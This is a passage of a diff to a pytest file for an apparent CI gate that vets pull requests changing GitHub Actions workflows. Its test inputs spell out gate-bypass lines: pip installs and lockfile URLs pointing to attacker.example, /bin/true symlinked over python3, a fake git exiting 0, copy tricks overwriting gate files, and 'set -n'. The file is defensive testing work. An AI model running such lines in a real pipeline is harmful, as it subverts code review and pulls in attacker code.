     for pre in ("tar -xf \"$RUNNER_TEMP/a.tar\"", "unzip -o \"$RUNNER_TEMP/a.zip\"", "python3 -m zipfile -e \"$RUNNER_TEMP/a.zip\" .", "python3 -m tarfile -e a.tar"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "runs inline code" in r.stdout, (pre, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          python3 -m pip install --quiet pyyaml\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          python3 -m pip install --quiet pyyaml\n          " + VERDICT_CMD)}, **cap).returncode == 0
     # red-team round four: a writer anywhere on the line, and `set -n`, which executes nothing after it
     for pre in ("command cp lib/model.py scripts/gate/spec_gate.py", "env cp lib/model.py scripts/gate/spec_gate.py",
                 "timeout 5 cp lib/model.py scripts/gate/spec_gate.py", "find lib -name model.py -exec cp {} scripts/gate/spec_gate.py \\;",
                 "printf -v gate '%s' scripts/gate/spec_gate.py; cp lib/model.py \"$gate\"",
                 "((1)) && cp lib/model.py scripts/gate/spec_gate.py", "coproc { cp lib/model.py scripts/gate/spec_gate.py; }"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
     for pre in ("{cp,lib/model.py,scripts/gate/spec_gate.py}", "$'cp' lib/model.py scripts/gate/spec_gate.py", "echo lib/model.py scripts/gate/spec_gate.py | xargs cp"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
     for pre in ("set -n", "set -o noexec", "set -en", "if true; then set -n; fi"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (pre, r.stdout)
     suite_text = "def test_a():\n    assert f(1)\n"
     on_base(repo, {"tests/scripts/test_spec_gate.py": suite_text})
@@ -3661,9 +3752,9 @@ def test_and_lists_eval_shopt_and_path_shadows_do_not_hide_a_failure(repo):
                        ("|\n          ln -s /bin/true /usr/local/bin/python3\n          " + VERDICT_CMD, "writes to or replaces a gate file"),
                        ("|\n          printf '#!/bin/sh\\nexit 0' > /usr/local/bin/git\n          " + VERDICT_CMD, "writes to or replaces a gate file"),
                        ("|\n          cp /bin/true \"$HOME/.local/bin/pytest\"\n          " + VERDICT_CMD, "writes to or replaces a gate file")):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a=shape)}, **cap)
         assert r.returncode == 1 and why in r.stdout, (shape, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow()}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow()}, **cap).returncode == 0
 
 
 def test_pr_bodies_manifests_and_ownership_read_as_github_renders_them(repo):
@@ -3746,11 +3837,11 @@ def test_folded_scalars_docs_payloads_and_dependency_values_are_refused(repo):
                    typed.replace("          ref: ${{ github.event.pull_request.base.sha }}\n", "          ref:\n            ${{ github.event.pull_request.head.sha }}\n", 1),
                    typed.replace("          PR_DRAFT: ${{ github.event.pull_request.draft }}\n", "          PR_DRAFT: ${{ github.event.pull_request.draft }}\n            x\n", 1)):
         assert folded != typed
-        r = pr(repo, "chore/gate-workflow", {wf: folded}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: folded}, **cap)
         assert r.returncode == 1 and "continues a plain scalar" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n", "defaults:\n  run:\n    working-directory: sub\npermissions:\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("permissions:\n", "defaults:\n  run:\n    working-directory: sub\npermissions:\n", 1)}, **cap)
     assert r.returncode == 1 and "`working-directory` under a top-level `defaults:`" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
     for path in ("docs/pkg/setup.py", "docs/pkg/pyproject.toml", "docs/evil-1.0-py3-none-any.whl", "docs/index.html", "docs/diagram.svg", "docs/tools/run.py",
                  "docs/conftest.py", "lib/.claude/skills/deploy/SKILL.md", "docs/.claude/settings.json", ".github/copilot-instructions.md",
                  ".github/instructions/all.instructions.md", ".github/agents/fixer.md", ".github/PULL_REQUEST_TEMPLATE.md"):
@@ -3814,27 +3905,27 @@ def test_gate_workflows_and_hook_are_pinned_and_hidden_steps_are_scanned(repo):
                  "      - run: git read-tree \"$HEAD_SHA\"\n", "      - run: git checkout-index -f -a\n",
                  "      - run: git switch --discard-changes --detach \"$HEAD_SHA\"\n", "      - run: git merge --no-edit -X theirs \"$HEAD_SHA\"\n",
                  "      - run: git show \"$HEAD_SHA:x.py\" > scripts//gate/spec_gate.py\n", "      - run: git show \"$HEAD_SHA:x.py\" > scripts/./gate/spec_gate.py\n"):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace(fetch, fetch + step, 1)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace(fetch, fetch + step, 1)}, **cap)
         assert r.returncode == 1 and ("writes to or replaces a gate file" in r.stdout or "runs inline code" in r.stdout), (step, r.stdout)
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(fetch, "      - run : git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py\n" + fetch, 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace(fetch, "      - run : git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py\n" + fetch, 1)}, **cap)
     assert r.returncode == 1 and "whitespace before a key's colon" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(fetch, "      - run: 'true\n          ; git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py'\n" + fetch, 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace(fetch, "      - run: 'true\n          ; git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py'\n" + fetch, 1)}, **cap)
     assert r.returncode == 1 and "quoted value it does not close" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
     # the pin: with copies on the base, the file must equal its copy
     pin = "scripts/gate/pinned/spec-gate.yml"
-    on_base(repo, {pin: typed})
+    on_base(repo, {pin: typed, PINNED_REGISTRY_CHECK: suite_workflow()})
     edited = typed.replace("name: spec-gate\n", "name: spec-gate\n# reviewed change\n", 1)
-    r = pr(repo, "chore/gate-workflow", {wf: edited}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: edited}, **cap)
     assert r.returncode == 1 and "differs from its pinned copy" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: edited, pin: edited}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: edited, pin: edited}, **cap)
     assert r.returncode == 1 and "differs from its pinned copy" in r.stdout, "changing both in one PR is measured against the base's copy"
     assert pr(repo, "chore/gate-workflow", {pin: edited}, **cap).returncode == 0, "step one: the copy alone"
     r = pr(repo, "chore/gate-workflow", {pin: None}, **cap)
     assert r.returncode == 1 and "cannot be removed" in r.stdout, r.stdout
     on_base(repo, {pin: edited})
-    assert pr(repo, "chore/gate-workflow", {wf: edited}, **cap).returncode == 0, "step two: the file equals the reviewed copy"
-    on_base(repo, {pin: None})
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: edited}, **cap).returncode == 0, "step two: the file equals the reviewed copy"
+    on_base(repo, {pin: None, PINNED_REGISTRY_CHECK: None})
 
 
 def test_links_are_not_files_and_deferrals_survive_markup(repo):
@@ -3907,7 +3998,7 @@ def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contrac
     """
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
-    typed = gate_workflow()
+    typed = old_gate_workflow()
     lock = '{"name":"x","lockfileVersion":3,"packages":{"":{"dependencies":{"lodash":"^4.17.21"}},"node_modules/lodash":{"version":"4.17.21","resolved":"https://%s/lodash-4.17.21.tgz","integrity":"sha512-AAAA"}}}\n'
     r = pr(repo, "chore/bump", {"package-lock.json": lock % "attacker.example"})
     assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
@@ -3962,18 +4053,18 @@ def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contrac
     assert r.returncode == 1 and ("differs from its pinned copy" in r.stdout or "carriage return" in r.stdout), r.stdout
     on_base(repo, {pin: None})
     for pre in ("ed -s scripts/gate/spec_gate.py", "echo x | sponge scripts/gate/spec_gate.py", "sort -o scripts/gate/spec_gate.py lib/model.py"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {wf: old_gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          cat scripts/gate/spec_gate.py > \"$RUNNER_TEMP/copy\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {wf: old_gate_workflow(a="|\n          cat scripts/gate/spec_gate.py > \"$RUNNER_TEMP/copy\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
     # round eight: pip and pytest are allow-listed, not flag-blocklisted; the handoff artifact is uploaded once, never overwritten
     for pre in ("python3 -m pip config set global.index-url https://attacker.example/simple", "python3 -m pip install https://attacker.example/pyyaml-9.whl",
                 "python3 -m pip install \"pyyaml @ https://attacker.example/x.whl\"", "python3 -m pip install git+https://attacker.example/x.git",
                 "python3 -m pip install -r https://attacker.example/req.txt", "python3 -m pip install --index https://attacker.example/simple pyyaml",
                 "python3 -m pip install ./", "pip install lib/", "python3 -m pytest --junit-xml=scripts/gate/spec_gate.py lib",
                 "python3 -m pytest tests/scripts/test_spec_gate.py -q --log-file=scripts/gate/spec_gate.py", "pytest -o cache_dir=scripts/gate lib"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {wf: old_gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "beyond what the gate needs" in r.stdout, (pre, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          python3 -m pip install --quiet pyyaml==6.0.2\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {wf: old_gate_workflow(a="|\n          python3 -m pip install --quiet pyyaml==6.0.2\n          " + VERDICT_CMD)}, **cap).returncode == 0
     upload = "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n"
     assert upload in typed
     r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, upload + upload.replace("${{ runner.temp }}/proposed/", "scripts/gate\n          overwrite: true"), 1)}, **cap)
@@ -3984,7 +4075,7 @@ def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contrac
     for pre in ("git diff --output=scripts/gate/spec_gate.py HEAD", "git log -1 --output scripts/gate/spec_gate.py", "python3 /dev/stdin <<EOF\n          import os\n          EOF",
                 "python3 -<<EOF\n          import os\n          EOF", "python3 <<EOF\n          import os\n          EOF", "python3 -m pip install .",
                 "python3 -m pip install -e .", "python3 -m pip install --index-url https://attacker.example/simple pyyaml", "pip install -f \"$RUNNER_TEMP\" pyyaml"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {wf: old_gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
     meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
     row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | ~~Production~~ | {TODAY} | #42 |").replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: ~~Production~~")
@@ -4086,11 +4177,11 @@ def test_post_download_actions_vacuous_assertions_and_escaped_pipes_are_the_cont
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
-    download = "      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n"
-    assert download in typed
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
+    download = "          python3 -m pytest tests/scripts/test_export_model_registry.py -q -p no:cacheprovider --noconftest\n"
+    assert suite_workflow().endswith(download)
     again = download + "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n"
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(download, again, 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow().replace(download, again, 1), wf: typed}, **cap)
     assert r.returncode == 1 and "after the handoff download" in r.stdout, r.stdout
     suite = "tests/scripts/test_spec_gate.py"
     on_base(repo, {suite: "def test_a():\n    r = run()\n    assert r.returncode == 0\n    assert r.stdout\n"})
@@ -4131,11 +4222,13 @@ def test_long_markers_indented_tasks_quoted_pnpm_keys_and_extra_actions_are_the_
         assert r.returncode == 1 and "pnpm-lock.yaml" in r.stdout, (lock, r.stdout)
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
-    upload = next(ln for ln in typed.splitlines() if "actions/upload-artifact" in ln)
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, "      - uses: some/action@v1\n" + upload, 1)}, **cap)
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
+    suite = suite_workflow()
+    copy = "      - run: |\n          cp "
+    assert suite.count(copy) == 1
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite.replace(copy, "      - uses: some/action@v1\n" + copy, 1), wf: typed}, **cap)
     assert r.returncode == 1 and "use only actions/checkout" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, "      - uses: actions/checkout@v4\n" + upload, 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite.replace("  base-suite:\n", "      - uses: actions/checkout@v4\n  base-suite:\n", 1), wf: typed}, **cap)
     assert r.returncode == 1 and "runs after a `run:` step" in r.stdout, r.stdout
 
 
@@ -4152,10 +4245,12 @@ def test_backslash_parity_unknown_needs_and_grouped_dispositions_are_the_contrac
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert "    needs: gate\n" in typed
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("    needs: gate\n", "    needs: [gate, missing]\n", 1)}, **cap)
+    suite = suite_workflow()
+    assert "  base-suite:\n    runs-on: ubuntu-latest\n" in suite
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite.replace("  base-suite:\n", "  base-suite:\n    needs: [registry, missing]\n", 1), wf: typed}, **cap)
     assert r.returncode == 1 and "is not a job of the workflow" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    needs: base-suite\n    runs-on: ubuntu-latest\n", 1)}, **cap)
+    cycle = suite.replace("  registry:\n", "  registry:\n    needs: base-suite\n", 1).replace("  base-suite:\n", "  base-suite:\n    needs: registry\n", 1)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: cycle, wf: typed}, **cap)
     assert r.returncode == 1 and "no cycle" in r.stdout, r.stdout
 
 
@@ -4415,9 +4510,9 @@ def test_chained_exits_quoted_hashes_and_headings_beside_rows_are_the_contract(r
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          true && exit 0\n          " + VERDICT_CMD)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          true && exit 0\n          " + VERDICT_CMD)}, **cap)
     assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          test -d scripts || exit 1\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          test -d scripts || exit 1\n          " + VERDICT_CMD)}, **cap).returncode == 0
     r = pr(repo, "docs/spec", {SPEC: spec().replace("status: approved", 'status: "approved # awaiting review"', 1)})
     assert r.returncode == 1 and "status" in r.stdout, r.stdout
     title = {"PR_TITLE": "FEAT-MODEL-001: x"}
@@ -6736,12 +6831,12 @@ def test_the_gate_suite_may_run_on_exactly_four_workers(repo):
     The exact pair is accepted on the suite contract command, in both gate workflows, with or without
     an exactly pinned pytest-xdist installed first."""
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
-    for wf, text in ((".github/workflows/spec-gate.yml", gate_workflow(c=SUITE_CMD + " -n 4")),
-                     (".github/workflows/spec-gate.yml", gate_workflow(c="python3 -m pytest tests/scripts/test_spec_gate.py -n 4 -q -p no:cacheprovider --noconftest")),
-                     (".github/workflows/spec-gate.yml", gate_workflow(c="|\n          " + PINNED_XDIST + "\n          " + SUITE_CMD + " -n 4")),
-                     (".github/workflows/registry-check.yml", registry_workflow(SERIAL_SUITE + " -n 4")),
-                     (".github/workflows/registry-check.yml", registry_workflow(SERIAL_SUITE + " -n 4", (PINNED_XDIST,)))):
-        r = pr(repo, "chore/gate-workflow", {wf: text}, **cap)
+    for wf, text in ((".github/workflows/registry-check.yml", gate_pair(c=SUITE_CMD + " -n 4")),
+                     (".github/workflows/registry-check.yml", gate_pair(c="python3 -m pytest tests/scripts/test_spec_gate.py -n 4 -q -p no:cacheprovider --noconftest")),
+                     (".github/workflows/registry-check.yml", gate_pair(c="|\n          " + PINNED_XDIST + "\n          " + SUITE_CMD + " -n 4")),
+                     (".github/workflows/registry-check.yml", {REGISTRY_CHECK: registry_workflow(SERIAL_SUITE + " -n 4")}),
+                     (".github/workflows/registry-check.yml", {REGISTRY_CHECK: registry_workflow(SERIAL_SUITE + " -n 4", (PINNED_XDIST,))})):
+        r = pr(repo, "chore/gate-workflow", text, **cap)
         assert r.returncode == 0, (wf, text, r.stdout)
 
 
@@ -6763,10 +6858,10 @@ def test_no_other_worker_form_runs_the_gate_suite(repo):
     plugin flag is refused in both gate workflows, as the suite line itself and as an extra line."""
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     for form, tail in WORKER_FORMS.items():
-        for wf, text in ((".github/workflows/spec-gate.yml", gate_workflow(c=SUITE_CMD + " " + tail)),
-                         (".github/workflows/registry-check.yml", registry_workflow(SERIAL_SUITE + " " + tail)),
-                         (".github/workflows/spec-gate.yml", gate_workflow(a="|\n          " + SUITE_CMD + " " + tail + "\n          " + VERDICT_CMD))):
-            r = pr(repo, "chore/gate-workflow", {wf: text}, **cap)
+        for wf, text in ((".github/workflows/registry-check.yml", gate_pair(c=SUITE_CMD + " " + tail)),
+                         (".github/workflows/registry-check.yml", {REGISTRY_CHECK: registry_workflow(SERIAL_SUITE + " " + tail)}),
+                         (".github/workflows/spec-gate.yml", gate_pair(a="|\n          " + SUITE_CMD + " " + tail + "\n          " + VERDICT_CMD))):
+            r = pr(repo, "chore/gate-workflow", text, **cap)
             assert r.returncode == 1 and ("no longer executes" in r.stdout or "beyond what the gate needs" in r.stdout), (form, wf, r.stdout)
 
 
@@ -6775,7 +6870,7 @@ def test_four_workers_belong_to_the_gate_suite_alone(repo):
     line carrying it is still more than the gate's workflows need."""
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     for pre in ("python3 -m pytest tests/scripts/test_export_model_registry.py -q -n 4",):
-        r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "beyond what the gate needs" in r.stdout, (pre, r.stdout)
 
 
@@ -6805,12 +6900,12 @@ def test_pytest_xdist_installs_only_at_an_exact_version(repo):
     whichever installer names it and however the shell spells it."""
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     for form, packages in UNPINNED_XDIST.items():
-        for wf, text in ((".github/workflows/spec-gate.yml", gate_workflow(c="|\n          python3 -m pip install --quiet " + packages + "\n          " + SUITE_CMD)),
-                         (".github/workflows/registry-check.yml", registry_workflow(SERIAL_SUITE, ("python3 -m pip install --quiet " + packages,)))):
-            r = pr(repo, "chore/gate-workflow", {wf: text}, **cap)
+        for wf, text in ((".github/workflows/registry-check.yml", gate_pair(c="|\n          python3 -m pip install --quiet " + packages + "\n          " + SUITE_CMD)),
+                         (".github/workflows/registry-check.yml", {REGISTRY_CHECK: registry_workflow(SERIAL_SUITE, ("python3 -m pip install --quiet " + packages,))})):
+            r = pr(repo, "chore/gate-workflow", text, **cap)
             assert r.returncode == 1 and "beyond what the gate needs" in r.stdout, (form, wf, r.stdout)
     for line in (*OTHER_INSTALLERS, *SHELL_SPELLINGS):
-        r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(c="|\n          " + line + "\n          " + SUITE_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", gate_pair(c="|\n          " + line + "\n          " + SUITE_CMD), **cap)
         assert r.returncode == 1 and "beyond what the gate needs" in r.stdout, (line, r.stdout)
 
 
@@ -6953,3 +7048,420 @@ def test_package_metadata_at_the_root_is_a_process_file(repo):
     assert refused.returncode == 1 and f"process change(s) ({path}) belong to FEAT-CICD-001" in refused.stdout, refused.stdout
     elsewhere = pr(repo, BRANCH, {**CODE, "lib/zzq-1.0.dist-info/entry_points.txt": "[pytest11]\n"}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body())
     assert elsewhere.returncode == 0, elsewhere.stdout
+
+
+# ---------------------------------------------------------------------------------------------
+# FEAT-CICD-001 contract stage (docs/superpowers/specs/2026-11-16-feat-cicd-001-base-suite-off-pull-request-target.md):
+# the base suites run in one of two layouts, judged across the live pair and across the pinned pair:
+# today's (spec-gate.yml job base-suite after the verdict, fed by the artifact handoff) or the moved one
+# (registry-check.yml job base-suite: the base checkout, the head's two gate files sparse into
+# proposed-head, one step that copies them over scripts/gate and runs the base's two suites).
+MOVED_HEAD_STEP = ("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
+                   "          path: proposed-head\n          persist-credentials: false\n"
+                   "          sparse-checkout: |\n            scripts/gate/spec_gate.py\n            scripts/gate/export_model_registry.py\n"
+                   "          sparse-checkout-cone-mode: false\n")
+MOVED_COPY_STEP = "      - run: |\n          cp "
+MOVED_EXPORT_SUITE = "          python3 -m pytest tests/scripts/test_export_model_registry.py -q -p no:cacheprovider --noconftest\n"
+
+
+def moved_refused(repo, registry: str, *needles: str, pinned: bool = False) -> None:
+    """The moved pair with `registry` as its registry-check.yml is refused, naming one of `needles`."""
+    files = gate_pair(pinned=pinned)
+    files[PINNED_REGISTRY_CHECK if pinned else REGISTRY_CHECK] = registry
+    assert registry != suite_workflow()
+    r = pr(repo, "chore/gate-workflow", files, PR_BODY="## Capacity\nn/a: x\n")
+    assert r.returncode == 1 and any(n in r.stdout for n in needles), (needles, r.stdout)
+
+
+def test_moved_base_suite_head_checkout_keeps_no_credentials(repo):
+    """The head checkout feeds PR-controlled code to the job, so it keeps no credentials."""
+    suite = suite_workflow()
+    assert suite.count(MOVED_HEAD_STEP) == 1
+    for pinned in (False, True):
+        moved_refused(repo, suite.replace(MOVED_HEAD_STEP, MOVED_HEAD_STEP.replace("          persist-credentials: false\n", "")),
+                      "holds no checkout credentials", pinned=pinned)
+        moved_refused(repo, suite.replace(MOVED_HEAD_STEP, MOVED_HEAD_STEP.replace("persist-credentials: false", "persist-credentials: true")),
+                      "holds no checkout credentials", pinned=pinned)
+        moved_refused(repo, suite.replace("          persist-credentials: false\n", "", 1),
+                      "holds no checkout credentials", pinned=pinned)
+
+
+def test_moved_base_suite_head_checkout_is_sparse_to_exactly_the_two_gate_files(repo):
+    """Nothing of the pull request but spec_gate.py and export_model_registry.py reaches the job."""
+    suite = suite_workflow()
+    sparse = "          sparse-checkout: |\n            scripts/gate/spec_gate.py\n            scripts/gate/export_model_registry.py\n"
+    assert suite.count(sparse) == 1
+    for broken in (suite.replace(sparse, ""),
+                   suite.replace(sparse, sparse + "            tests/scripts/test_spec_gate.py\n"),
+                   suite.replace(sparse, "          sparse-checkout: |\n            scripts/gate\n"),
+                   suite.replace(sparse, "          sparse-checkout: |\n            scripts/gate/*\n"),
+                   suite.replace("          sparse-checkout-cone-mode: false\n", ""),
+                   suite.replace("          sparse-checkout-cone-mode: false\n", "          sparse-checkout-cone-mode: true\n")):
+        for pinned in (False, True):
+            moved_refused(repo, broken, "sparse to exactly", pinned=pinned)
+
+
+def test_moved_base_suite_job_runs_no_git_fetch(repo):
+    """actions/checkout reaches the head with the job's read-only token; the job fetches nothing itself."""
+    suite = suite_workflow()
+    fetch = "git fetch --no-tags origin \"$HEAD_SHA\""
+    for broken in (suite.replace("          rm -rf proposed-head\n", "          rm -rf proposed-head\n          " + fetch + "\n", 1),
+                   suite.replace(MOVED_COPY_STEP, "      - run: " + fetch + "\n" + MOVED_COPY_STEP, 1),
+                   suite.replace("          rm -rf proposed-head\n", "          rm -rf proposed-head\n          git fetch --depth=1 origin main\n", 1)):
+        for pinned in (False, True):
+            moved_refused(repo, broken, "runs `git fetch`", pinned=pinned)
+
+
+def test_moved_base_suite_suites_run_only_after_the_copy(repo):
+    """Each base suite runs after the proposed files replace the base's, never before."""
+    for broken in (suite_workflow(b=SUITE_CMD + "\n          " + COPY_CMD, c="echo done"),
+                   suite_workflow().replace(MOVED_EXPORT_SUITE, "").replace("          cp proposed-head", MOVED_EXPORT_SUITE + "          cp proposed-head", 1),
+                   suite_workflow().replace(MOVED_COPY_STEP, "      - run: " + SUITE_CMD + "\n" + MOVED_COPY_STEP, 1)):
+        for pinned in (False, True):
+            moved_refused(repo, broken, "does not follow", pinned=pinned)
+
+
+def test_moved_base_suite_runs_no_action_after_the_copy(repo):
+    """The copy is the last action before the suites: nothing puts the base's gate back."""
+    suite = suite_workflow()
+    assert suite.endswith(MOVED_EXPORT_SUITE)
+    for after in ("      - uses: actions/upload-artifact@v4\n        with:\n          name: x\n          path: scripts/gate\n",
+                  "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n",
+                  "      - uses: actions/cache@v4\n        with:\n          path: scripts/gate\n          key: k\n"):
+        for pinned in (False, True):
+            moved_refused(repo, suite + after, "after the handoff download", pinned=pinned)
+
+
+def test_moved_base_suite_reads_no_secret(repo):
+    """The job that runs PR-controlled code reads no secret and no token expression; the same pair without
